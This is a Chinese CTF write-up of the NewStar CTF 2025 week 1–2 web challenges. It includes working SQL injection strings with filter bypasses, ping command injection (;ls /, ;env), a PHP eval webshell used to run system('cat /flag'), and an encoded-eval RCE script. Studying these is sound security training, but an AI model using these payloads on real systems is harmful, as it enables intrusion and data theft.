---
title: NewStar CTF 2025 WP Web部分
published: 2026-04-13
description: Week1&Week2
image: "./2.jpg"
tags: ["CTF"]
category: CTF
draft: false
slug: NewStar_CTF_2025_WP_Web部分
---

## Week1 Web

### 宇宙的中心是 PHP

打开容器，可以发现 F12 被禁了

我们可以直接在 URL 前加上 `view-source:` 去查看源码：

得到源码的有效信息为：

```plain
|<!-- 你还是找到了......这片黑暗的秘密 -->|
|<!-- s3kret.php -->|
```

访问 `/s3kret.php`，得到：

```php
<?php  
highlight_file(__FILE__);  
include "flag.php";  
if(isset($_POST['newstar2025'])){    $answer = $_POST['newstar2025'];  
    if(intval($answer)!=47&&intval($answer,0)==47){  
        echo $flag;  
    }else{  
        echo "你还未参透奥秘";  
    }  
}
```

解释下核心逻辑：

使用 **POST** 方式传入一个名为 `newstar2025` 的参数，并把它的值赋值给 `$answer` 这个变量。若 `$answer` 的值在 **10进制** 的时候不等于 47，且使用 `$answer` 变量进制的时候等于 47，则得到 flag

这里重点是要知道 `intvar()` 这个函数的用法：

[`intvar($value, $base = 10)`](https://www.php.net/manual/zh/function.intval.php)：获取变量的整数值

默认情况下 base = 10，即按照 10进制 获取变量的值

而当 base = 0 时，则通过检测 `value` 的格式来决定使用的进制：
- 如果字符串包括了 "0x" (或 "0X") 的前缀，使用 16 进制 (hex)；否则，
- 如果字符串以 "0b" (或 "0B") 开头，使用 2 进制 (binary)；否则，
- 如果字符串以 "0" 开始，使用 8 进制(octal)；否则，
- 将使用 10 进制 (decimal)。

这样目标就很明确了，不以 10进制 数传参使得 `$answer = 47` 即可

最终 payload：
```plain
newstar2025=0x2F
```

得到 flag：flag{a2928e78-7db3-8780-a368-9d6cbae9ecfb}

### multi-headach3

打开容器，得到：

```plain
# Hello!

Today is 2026/04/07

welcome to my first website!  
  
**ROBOTS** is protecting this website!  
But... Why my head is so **painful**???!!!  
And why you are here again and again?  
Trust me, hidden page is not as simple as you think.
```

这里提到 robots，可以想到 **robots.txt 协议**

> 若不了解 robots.txt 协议可以点击[这里](https://www.cloudflare.com/zh-cn/learning/bots/what-is-robots-txt/)

直接访问 `/robots.txt`，得到如下结果：

```plain
User-agent: *
Disallow: /hidden.php
```

都 Disallow 那肯定是要看看的 2333

访问 `/hidden.php`，得到：

```plain
# Hello!

Today is 2026/04/07

welcome to my first website!  
  
**ROBOTS** is protecting this website!  
But... Why my head is so **painful**???!!!  
And why you are here again and again?  
Trust me, hidden page is not as simple as you think.
```

和原网页一模一样，可见没什么用处（恼

这里还有个信息 head，联想到 **HTTP请求头**

抓包（访问 `/hidden.php` 的时候），得到：

flag{3057d5d3-fb7d-e4ef-01a6-27dd3f0527f9}

### strange_login

打开容器，看到一个登录界面：

考察的是简单的 **SQL注入**

构造：`admin' and 1=1-- ` 直接得到 flag：

（具体解释因为比较基础可以自己去网上找找基础的**SQL注入**学习）

flag{56119305-d5c4-1e35-c902-bc160b877645}

### 别笑，你也过不了第二关

z学姐出的题目说是（

打开容器，是一个接掉落物的游戏：

第一关拿到30分即可通过到第二关

第二关要1000000分才能过

看了下源码和实操了下，正常情况下绝对拿不到1000000分

直接在控制台执行：

```javascript
score = 1000000;
```

得到 flag：flag{e9b75cd5-dcd8-cfca-b134-a0f730b3a0a3}

### 我真得控制你了

打开容器，发现有个启动键（但被 ban 了

点击 F12 发现也被 ban 了

（这里以 Chrome 浏览器为例）

这里我们可以点击右上角的三个点->更多工具->开发者工具，就可以看到源码了

但是此时的警告界面还是不断跳出来

查看源码，发现警告界面的元素为 `devToolsWarning`

直接把此元素删了即可，警告界面消失

但是启动键被 ban 的问题还没解决

这里有两种办法：

法1是直接将屏障启动键元素 `shieldOverlay` 删了即可

法2是使用控制台：

`document.getElementById('shieldOverlay').remove();`

其实质也是将 `shieldOverlay` 这个元素删除

删除后点击启动进入下一关

下一关有明显的提示为弱口令/弱密码爆破

这里直接使用 BurpSuite 进行爆破：

爆破发现密码为 11111

> 注：这里我们按理来将有两个元素需要爆破：用户名和密码，但实际的 CTF 题目一般都是在密码上下文章，因此这里是使用常见的用户名 admin 过关的

输入密码后进入下一关

此关直接给出了源码：

```php
<?php
error_reporting(0);

function generate_dynamic_flag($secret) {
    return getenv("ICQ_FLAG") ?: 'default_flag';
}


if (isset($_GET['newstar'])) {
    $input = $_GET['newstar'];
    
    if (is_array($input)) {
        die("恭喜掌握新姿势");
    }
    

    if (preg_match('/[^\d*\/~()\s]/', $input)) {
        die("老套路了，行不行啊");
    }
    

    if (preg_match('/^[\d\s]+$/', $input)) {
        die("请输入有效的表达式");
    }
    
    $test = 0;
    try {
        @eval("\$test = $input;");
    } catch (Error $e) {
        die("表达式错误");
    }
    
    if ($test == 2025) {
        $flag = generate_dynamic_flag($flag_secret);
        echo "<div class='success'>拿下flag！</div>";
        echo "<div class='flag-container'><div class='flag'>FLAG: {$flag}</div></div>";
    } else {
        echo "<div class='error'>大哥哥泥把数字算错了: $test ≠ 2025</div>";
    }
} else {
    ?>
<?php } ?>
```

解释下逻辑：

此题先需要我们使用 **GET** 方法传入一个名为 `newstar` 的元素并将其赋值给 `input` 元素；`input` 不能是数组，其值必须在数字、\*和/和~和()和空白字符，且不能是纯数字或者纯空白；将 `input` 的值传给 `test`，若 `test` 传入的表达式有误，则会触发 `try...catch` 输出 “表达式错误”；在此后若 `test` 等于 2025，则给出 flag

解释下理解必要的用法：

getenv — 获取一个环境变量的值

is_array — 检测变量是否是数组

die：等于 exit()

exit — 输出一个消息并且退出当前脚本

preg_match — 执行匹配正则表达式

> 若对正则表达式不了解可以看看这篇文章：[菜鸟教程](https://www.runoob.com/regexp/regexp-syntax.html)

`?:`：三元运算符的缩写，用法如下：

```php
$result = $a ?: $b;
等同于
$result = $a ? $a : $b;
```

看到 **不能全是数字** 这一条件，可以想到使用乘除法等将2025算出来

刚好 2025 是一个完全平方数，所有最终 payload：

```plain
/?newstar=45*45
```

得到 flag：flag{c80c003f-1d66-8de7-e3fb-1575c0921d53}

### 黑客小 W 的故事（1）

进入容器，发现要我们点击中间的一个 chongzi，每次点击都会得到一定的分数，到

了 800 分就能通关（并非

这里如果一直尝试的话会发现在点击途中一定会被阻拦然后分数清零

题目提示抓包，我们试图抓包改数据：

```http
POST /hunt HTTP/1.1

Host: 192.168.42.1:60152

Accept: */*

Origin: http://192.168.42.1:60152

Accept-Encoding: gzip, deflate

Cookie: token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJOYW1lIjoiYjBmNzFmOGYtMGFlNy00NDRhLTg0MjAtMDVlMDllODYwNzIzIiwibGV2ZWwiOjF9.GGjj_uyDLSatsFEt4bA1aF4zLj3nbzdWLdmCYOtAMrE

User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36

Accept-Language: zh-CN,zh;q=0.9

Content-Type: application/json

Referer: http://192.168.42.1:60152/hunt

Content-Length: 11

  

{"count":1}
```

这里可以看到，`{"count":1}` 就是我们的分数

直接将其改为 1000，到达第二关：

```http
HTTP/1.1 200 OK

Server: Werkzeug/3.1.3 Python/3.12.11

Date: Sat, 11 Apr 2026 12:28:43 GMT

Content-Type: application/json

Set-Cookie: token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJOYW1lIjoiVHJ1ZSIsImxldmVsIjoyfQ.Xz7r0_c7lyf1E8iXWszsQBC1c43djRjjWLf5tzWnIok; Path=/

Connection: close

Content-Length: 29

  

{"NextLevel":"/Level2_mato"}
```

第二关首先提示要使用 **GET** 方式传入值为 `mogubaozi` 名为 `shipin` 的参数

```plain
?shipin=mogubaozi
```

随后提示要使用 `POST` 方式告诉它事情（即 guding

这里使用 hackbar 传参：

```plain
code=guding
```

进入下一步，说是要使用 **DELETE** 方式去掉所有的 chongzi

直接在 Yakit 内发送数据包：

```http
DELETE /talkToMushroom?shipin=mogubaozi HTTP/1.1

Host: 192.168.42.1:60152

Cache-Control: max-age=0

Origin: http://192.168.42.1:60152

Upgrade-Insecure-Requests: 1

Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7

Accept-Language: zh-CN,zh;q=0.9

Accept-Encoding: gzip, deflate

Cookie: token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJOYW1lIjoiVHJ1ZSIsImxldmVsIjoyfQ.Xz7r0_c7lyf1E8iXWszsQBC1c43djRjjWLf5tzWnIok

User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36

Content-Type: application/x-www-form-urlencoded

Referer: http://192.168.42.1:60152/talkToMushroom?shipin=mogubaozi

Content-Length: 11

  

chongzi
```

进入下一关，这里可以刷新下网页得到下一步指引：

```plain
你已经帮我把虫子弄掉了，我把骨钉给你吧，你可以回去找那个大家伙了（/Level2_END）
```

这里提示我们改 **User-Agent**

> 可以点击[此处](https://developer.mozilla.org/en-US/docs/Glossary/User_agent)去了解下 User-Agent

原 UA：

```plain
Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36
```

修改为：

```plain
CycloneSlash/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36
```

再改为：

```plain
CycloneSlash/5.0 (Windows NT 10.0; Win64; x64) DashSlash/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36
```

得到下一关方法 `/Level4_Sly`

进入下一关发现终于结束，得到 flag：

flag{4508d441-7a16-a379-c391-0905c60c0a1e}

## Week2 Web

### DD 加速器

这道题目的关键是从提示 “本结果由系统命令 ping 产生” 中猜测到 **RCE**

知道提示就很简单了（甚至不需要了解 ping，和本题目一点关系没有

系统命令 ping 的基本结构：

```plain
ping x.x.x.x
```

可以看到服务器操作系统为 Debian，直接拼接 Linux 系统命令即可：

```plain
127.0.0.1;ls /
```

得到：

```plain
PING 127.0.0.1 (127.0.0.1) 1400(1428) bytes of data.
1408 bytes from 127.0.0.1: icmp_seq=1 ttl=64 time=0.031 ms

--- 127.0.0.1 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 0.031/0.031/0.031/0.000 ms
bin
boot
dev
etc
flag
home
lib
lib64
media
mnt
opt
proc
root
run
sbin
srv
sys
tmp
usr
var

```

但这道题的 flag 在环境变量里（这里面的是个假 flag

执行 `127.0.0.1;env` 拿到 flag：

flag{d58d03fd-3467-ecb8-5bec-a6af064fbc41}

### 真的是签到诶

进入容器，直接给出了源码：

```php
<?php
highlight_file(__FILE__);

$cipher = $_POST['cipher'] ?? '';

function atbash($text) {
  $result = '';
  foreach (str_split($text) as $char) {
    if (ctype_alpha($char)) {
      $is_upper = ctype_upper($char);
      $base = $is_upper ? ord('A') : ord('a');
      $offset = ord(strtolower($char)) - ord('a');
      $new_char = chr($base + (25 - $offset));
      $result .= $new_char;
    } else {
      $result .= $char;
    }
  }
  return $result;
}

if ($cipher) {
  $cipher = base64_decode($cipher);
  $encoded = atbash($cipher);
  $encoded = str_replace(' ', '', $encoded);
  $encoded = str_rot13($encoded);
  @eval($encoded);
  exit;
}

$question = "真的是签到吗？";
$answer = "真的很签到诶！";

$res =  $question . "<br>" . $answer . "<br>";
echo $res . $res . $res . $res . $res;

?>
```

对源码进行分析：

先用 **POST** 方法传入一个名为 `cipher` 的变量，再对其进行 **base64** 编码，随后调用 `atbash` 这个自定义函数，将返回值赋值给 `encoded`，再对其去掉空格，再进行一次 **rot13**，将结果执行 eval 函数
我个人觉得 `$is_upper = ctype_upper($char);` 这个语句比较重要，is_upper 并是一个布尔类型的变量，若右式为真，则被赋值为 true；否则被赋值为 false

这里看了操作系统为 Debian，还有 eval 函数，因此很明显存在 **RCE**

关键理解点：

str_split — 将字符串转换为数组

foreach (... as $char)：遍历数组并将每个数组字符赋值给 char

ctype_alpha — 做纯字符检测（指的是 a-z 和 A-Z）

ctype_upper — 做大写字母检测

ord — 转换字符串第一个字节为 0-255 之间的值
- 这里 ord('A') 为65，ord('a') 为97

strtolower — 将字符串转化为小写

str_replace — 子字符串替换

这里贴出脚本：

```python
import base64
import codecs

def atbash(text):
    result = ''
    for char in text:
        if char.isalpha():
            is_upper = char.isupper()
            base = ord('A') if is_upper else ord('a')
            offset = ord(char.lower()) - ord('a')
            new_char = chr(base + (25 - offset))
            result += new_char
        else:
            result += char
    return result

def inverse_atbash(text):
    result = ''
    for char in text:
        if char.isalpha():
            is_upper = char.isupper()
            base = ord('A') if is_upper else ord('a')
            offset = ord(char.lower()) - ord('a')
            new_char = chr(base + (25 - offset))
            result += new_char
        else:
            result += char
    return result

# 我们最终希望 eval 执行的代码（payload）
payload = 'system("cat\\040/flag");'   # 用 \\040 避免空格被提前处理

print("目标 payload:", payload)

# 1. rot13(payload) 得到 rot13 之前的字符串
before_rot13 = codecs.encode(payload, 'rot_13')
print("rot13 前的字符串:", before_rot13)

# 2. atbash 后的字符串（去空格前）应该产生 above（我们构造时不插入多余空格）
atbash_output = before_rot13.replace(' ', '')   # 确保去空格后正确

# 3. 求 atbash 的输入（即 base64_decode 后的内容）
cipher_decoded = inverse_atbash(atbash_output)
print("base64_decode 后应得到的字符串:", cipher_decoded)

# 4. 计算最终的 cipher（base64 编码）
cipher = base64.b64encode(cipher_decoded.encode()).decode()
print("\n最终需要 POST 的 cipher 值：")
print(cipher)

# 正向验证
print("\n=== 正向验证 ===")
decoded = base64.b64decode(cipher).decode()
after_atbash = atbash(decoded)
after_remove_space = after_atbash.replace(' ', '')
after_rot13 = codecs.encode(after_remove_space, 'rot_13')
print("最终 eval 执行的代码:", after_rot13)
print("验证成功:", after_rot13 == payload)
```

### 白帽小 K 的故事（1）

进去后根据提示发现为文件上传漏洞

这里直接上传一句话木马：

```php
<?php @eval($_POST['a']); ?>
```

上传后访问：

```plain
http://192.168.153.1:19185/v1/onload

file=123.php&a=system('cat /flag');
```

得到 flag：

flag{30d21bfa-aa21-b8ce-edbb-e6135464f5ee}

### 搞点哦润吉吃吃🍊

qu学长出的题目（

进入容器，有个登录界面，在源码的最下方找到账号和密码，进入

下一步是要求计算 token 并且 3s 内提交，有表达式：

```plain
token = (int(time.time()) * multiplier) ^ xor_value
```

time.time() —— 返回当前时间的时间戳（1970纪元后经过的浮点秒数）

multiplier —— 乘数，一般是个定值

xor_value —— 点击[这里](https://www.ibm.com/docs/en/i/7.5.0?topic=functions-xor)去了解异或

提示说抓包，我们进行抓包，得到数据如下：

```http
HTTP/1.1 200 OK

Server: Werkzeug/2.3.7 Python/3.12.11

Date: Sun, 12 Apr 2026 06:48:39 GMT

Content-Type: application/json

Vary: Cookie

Set-Cookie: session=.eJxNy8EKhSAQQNF_mbWL9GGW6_5DpAYTJo1phAfRv1e71veeE-Y1EmFJGLZGknfKyOCNHYxTn3hIZAmSNwSvnbOj660ev8e_Pk6bvjPdzyqgmhIuIRfwwg0VtAO5xNfDVLnCdQNO-ilV.adtARw.KI6gUMOaKTgX_xTynI-Pnz1dHKk; HttpOnly; Path=/

Connection: close

Content-Length: 287

  

{

  "expression": "token = (1775976519 * 25827) ^ 0xc04ab3",

  "hint": "doro记得这里会在session里面添加验证参数, 也许Set-Cookie可以帮助我们......",

  "multiplier": 25827,

  "xor_value": "0xc04ab3"

}
```

这里大致意思是指不光要写脚本去计算随机生成的计算 token 的数据，还得去自动读取每次开始挑战浏览器给的随机的 **session**，带上这个 **session** 发送数据包才有意义

最终脚本如下：

```python
import requests
import time
BASE_URL = "http://192.168.153.1:9223"
LOGIN_SESSION = "eyJsb2dnZWRfaW4iOnRydWUsInVzZXJuYW1lIjoiRG9ybyJ9.adsLpA.lTV0J_HJbj3H9h-9c58kMhXWZFw"
HEADERS = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
    "Content-Type": "application/json",
    "Accept": "*/*",
    "Origin": BASE_URL,
    "Referer": f"{BASE_URL}/home",
}
session = requests.Session()
session.headers.update(HEADERS)
session.cookies.update({'session': LOGIN_SESSION})
print("[*] 开始挑战流程...")
# Step 1: start_challenge
start_resp = session.post(f"{BASE_URL}/start_challenge", json={})
print(f"[*] start_challenge 状态: {start_resp.status_code}")
# 关键：完整接收并更新所有返回的 Cookie（尤其是新的 session）
if start_resp.cookies:
    old_session = session.cookies.get('session')
    session.cookies.update(start_resp.cookies)
    new_session = session.cookies.get('session')
    print(f"[*] Cookie 已更新 | 新 session: {new_session[:60]}...")
data = start_resp.json()
print(f"[*] 挑战数据: {data}")
# Step 2: 计算 token（使用当前时间戳）
multiplier = int(data['multiplier'])
xor_val = int(data['xor_value'], 16)
current_ts = int(time.time()) # 使用现在的时间
token = (current_ts * multiplier) ^ xor_val
print(f"[*] 当前时间戳: {current_ts}")
print(f"[*] multiplier : {multiplier}")
print(f"[*] xor_value : {hex(xor_val)}")
print(f"[*] 计算 token : {token}")
# Step 3: 立即提交（不要有延迟）
print("[*] 正在提交 verify_token...")
verify_resp = session.post(f"{BASE_URL}/verify_token", json={"token": token})
print(f"[*] 提交状态码: {verify_resp.status_code}")
try:
    result = verify_resp.json()
    print(f"🎉 结果: {result}")
   
    if result.get('success') == True or 'flag' in str(result).lower():
        print("\n✅ 成功！拿到 FLAG 了！")
    else:
        print("\n❌ 还是失败 → 建议**立刻**再运行一次脚本（时间很敏感）")
except Exception:
    print(f"🚨 响应内容: {verify_resp.text}")
```
### 小 E 的管理系统

题目提示是 SQL 注入，这里先试图构造单引号

发现单引号，空格均被过滤

随后可以尝试编码绕过，如使用 %09，%20等等可以替代空格的

构造 `1%09union` 得到如下报错：

```plain
{"error":"database error: Unable to prepare statement: incomplete input"}
```

询问 AI 得知此题数据库大概率为 **SQLite**

后续再试常规的 union 注入过程中发现 , 被过滤

这里使用 join 去绕过：

```plain
http://127.0.0.1:37458/query.php?id=1%09union%09select%09*%09from%09(select%091)%09a%09join%09(select%092)%09b%09join%09(select%093)%09c%09join%09(SELECT%09name%09FROM%09sqlite_master)%09d%09join%09(select%09sql%09FROM%09sqlite_master)%09f
```

得到结果：

```http
[{"id":1,"cpu":2,"ram":3,"status":"node_status","lastChecked":null},{"id":1,"cpu":2,"ram":3,"status":"node_status","lastChecked":"CREATE TABLE node_status (\n    node_id INTEGER PRIMARY KEY,\n    cpu_usage VARCHAR(10),\n    ram_usage VARCHAR(10),\n    status VARCHAR(15) CHECK(status IN ('Online','Offline','Maintenance')),\n    last_checked DATETIME DEFAULT CURRENT_TIMESTAMP\n)"},{"id":1,"cpu":2,"ram":3,"status":"node_status","lastChecked":"CREATE TABLE sqlite_sequence(name,seq)"},{"id":1,"cpu":2,"ram":3,"status":"node_status","lastChecked":"CREATE TABLE sys_config (\n    id INTEGER PRIMARY KEY AUTOINCREMENT,\n    config_key VARCHAR(50) UNIQUE,\n    config_value TEXT\n)"},{"id":1,"cpu":2,"ram":3,"status":"sqlite_autoindex_sys_config_1","lastChecked":null},{"id":1,"cpu":2,"ram":3,"status":"sqlite_autoindex_sys_config_1","lastChecked":"CREATE TABLE node_status (\n    node_id INTEGER PRIMARY KEY,\n    cpu_usage VARCHAR(10),\n    ram_usage VARCHAR(10),\n    status VARCHAR(15) CHECK(status IN ('Online','Offline','Maintenance')),\n    last_checked DATETIME DEFAULT CURRENT_TIMESTAMP\n)"},{"id":1,"cpu":2,"ram":3,"status":"sqlite_autoindex_sys_config_1","lastChecked":"CREATE TABLE sqlite_sequence(name,seq)"},{"id":1,"cpu":2,"ram":3,"status":"sqlite_autoindex_sys_config_1","lastChecked":"CREATE TABLE sys_config (\n    id INTEGER PRIMARY KEY AUTOINCREMENT,\n    config_key VARCHAR(50) UNIQUE,\n    config_value TEXT\n)"},{"id":1,"cpu":2,"ram":3,"status":"sqlite_sequence","lastChecked":null},{"id":1,"cpu":2,"ram":3,"status":"sqlite_sequence","lastChecked":"CREATE TABLE node_status (\n    node_id INTEGER PRIMARY KEY,\n    cpu_usage VARCHAR(10),\n    ram_usage VARCHAR(10),\n    status VARCHAR(15) CHECK(status IN ('Online','Offline','Maintenance')),\n    last_checked DATETIME DEFAULT CURRENT_TIMESTAMP\n)"},{"id":1,"cpu":2,"ram":3,"status":"sqlite_sequence","lastChecked":"CREATE TABLE sqlite_sequence(name,seq)"},{"id":1,"cpu":2,"ram":3,"status":"sqlite_sequence","lastChecked":"CREATE TABLE sys_config (\n    id INTEGER PRIMARY KEY AUTOINCREMENT,\n    config_key VARCHAR(50) UNIQUE,\n    config_value TEXT\n)"},{"id":1,"cpu":2,"ram":3,"status":"sys_config","lastChecked":null},{"id":1,"cpu":2,"ram":3,"status":"sys_config","lastChecked":"CREATE TABLE node_status (\n    node_id INTEGER PRIMARY KEY,\n    cpu_usage VARCHAR(10),\n    ram_usage VARCHAR(10),\n    status VARCHAR(15) CHECK(status IN ('Online','Offline','Maintenance')),\n    last_checked DATETIME DEFAULT CURRENT_TIMESTAMP\n)"},{"id":1,"cpu":2,"ram":3,"status":"sys_config","lastChecked":"CREATE TABLE sqlite_sequence(name,seq)"},{"id":1,"cpu":2,"ram":3,"status":"sys_config","lastChecked":"CREATE TABLE sys_config (\n    id INTEGER PRIMARY KEY AUTOINCREMENT,\n    config_key VARCHAR(50) UNIQUE,\n    config_value TEXT\n)"},{"id":1,"cpu":"23%","ram":"45%","status":"Online","lastChecked":"2026-04-13 04:20:30"}]
```

这里我们查询 sys_config：

```plain
1%09union%09select%09*%09from%09(select%091)%09a%09join%09(select%092)%09b%09join%09(select%093)%09c%09join%09(SELECT%09config_key%09FROM%09sys_config)%09d%09join%09(SELECT%09config_value%09FROM%09sys_config)%09f
```

得到 flag：

flag{58af282f-3a2d-545c-f595-83d735e13d76}